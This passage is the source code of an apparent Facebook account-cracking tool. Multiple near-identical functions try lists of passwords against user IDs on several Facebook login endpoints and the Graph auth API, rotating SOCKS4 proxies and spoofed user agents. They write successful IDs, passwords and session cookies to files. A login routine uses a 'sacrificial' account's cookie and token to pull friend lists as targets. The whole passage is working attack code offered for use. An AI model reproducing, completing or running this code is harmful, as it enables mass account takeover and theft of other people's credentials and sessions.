				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode15(idi,sandi):
	global cp,ok,loop
	print(f'\r#D-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			kode = tamsis.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			tamsis.headers.update({'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw}
			hulu={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode6(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mobile-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			kode = tamsis.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			tamsis.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw}
			hulu={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode5(idi,sandi):
	global cp,ok,loop
	print(f'\rFeee-validate# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis=requests.Session()
			tamsis.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			kode = tamsis.get('https://free.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(kode)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),"uid":idi,"flow":"login_no_pin","pass":pw}
			hulu={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			tamsis.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=hulu)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def graph(idi,sandi):
	global cp,ok,loop
	print(f'\r#graph# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			hulu={'user-agent':ua}
			date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'email':idi, 'locale': 'id_ID', 'password':pw, 'sdk': 'android', 'generate_session_cookies': '1'}
			login = tamsis.post("https://graph.facebook.com/auth/login",proxies=proxs,headers=hulu,data=date,allow_redirects=False).json()
			if "session_key" in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif "www.facebook.com" in login["error"]["message"]:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1			
def metode10(idi,sandi):
	global cp,ok,loop
	print(f'\r#Mbasic-regular# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis = requests.Session()			
	for pw in sandi:
		try:
			
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			kode = tamsis.get('https://mbasic.facebook.com/login/?email='+idi).text
			data ={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			tamsis.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?email='+idi,'accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			tamsis.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated h2',data=dataa,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]ID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def metode16(idi,sandi):
	global cp,ok,loop
	print(f'\r#Iphone-reguler# {loop}/{len(id)} [{idi}]  CP : {cp} OK :{ok} ',end='  ')
	sys.stdout.flush()
	ua = random.choice(uaa)
	tamsis=requests.Session()
	for pw in sandi:
		try:
			prk=random.choice(bro)
			proxs= {'http': 'socks4://'+prk}
			tamsis.headers.update({"Host":"iphone.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://iphone.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			kode = tamsis.get('https://iphone.facebook.com/login/?email='+idi).text
			data ={'lsd':re.search('name="lsd" value="(.*?)"', str(kode)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(kode)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(kode)).group(1),'li':re.search('name="li" value="(.*?)"', str(kode)).group(1),'email':idi,'pass':pw}
			hulu={'Host': 'iphone.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://iphone.facebook.com/login/?email='+idi,'accept-encoding':'gzip, deflate br','accept-language':'en-GB,en-US;q=0.9,en;q=0.8'}
			tamsis.post('https://iphone.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=data,allow_redirects=False,headers=hulu,proxies=proxs)
			login=tamsis.cookies.get_dict().keys()
			if 'c_user' in login:
				ok+=1
				kuki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				print('\n')
				cetak(pnl(f"""
[green]\nID : {idi}
PASSWORD : {pw}
COOKIE : {kuki}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-OK",style=f"bold white"))
				open('tamsis'+svo,'a').write('++++++++++++++++++++++++++++++++++++\nID :'+idi+'\nPassword : '+pw+'\nCookie : '+kuki+'\n++++++++++++++++++++++++++++++++++++\n')
				break
			elif 'checkpoint' in login:
				cp+=1
				print('\n')
				cetak(pnl(f"""[yellow]
ID : {idi}
Password : {pw}
User-Agent : {ua}[white]
""",width=90,padding=(0,1),title=f"Tamsis-CP",style=f"bold white"))
				open('tamsis'+svc,'a').write(idi+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:bobo(31)
	loop+=1
def login():
	try:
		cookie = open('cok.txt','r').read()
		tokeeen = open('Token.txt','r').read()
		p = Tamsis(f'https://graph.facebook.com/v16.0/me?fields=friends.limit(5000)&access_token='+tokeeen,cookies={'cookie': cookie}).json()
		try :
			for i in p['error']['message']:
				termux('rm -rf cok.txt')
				termux('rm -rf Token.txt')
				cetak(pnl(f"""Akun Tersebut Tidak Bisa Di Gunakan Untuk Tumbal\nGunakan Akun Fress"""))
				exit()
		except KeyError:
			token.append(tokeeen)
			cok.append(cookie)
	except FileNotFoundError:
		cetak(pnl('Token Dari Kiwi Browser Kadang Gk Bisa'))
		cetak(pnl('Kamu Belum Login'))
		a = input('Masukan Cookie : ')
		b = input('Masukan Token : ')
		p = Tamsis(f'https://graph.facebook.com/v1.0/me?fields=friends.limit(5000)&access_token='+b,cookies={'cookie': a}).json()
		try :
			for i in p['error']['message']:
				cetak(pnl(f"""Akun Tersebut Tidak Bisa Di Gunakan Untuk Tumbal\nGunakan Akun Fress"""))
				exit()
		except:
			open('cok.txt','w').write(a)
			open('Token.txt','w').write(b)
			cok.append(a)
			token.append(b)
login()
termux('clear')
menu()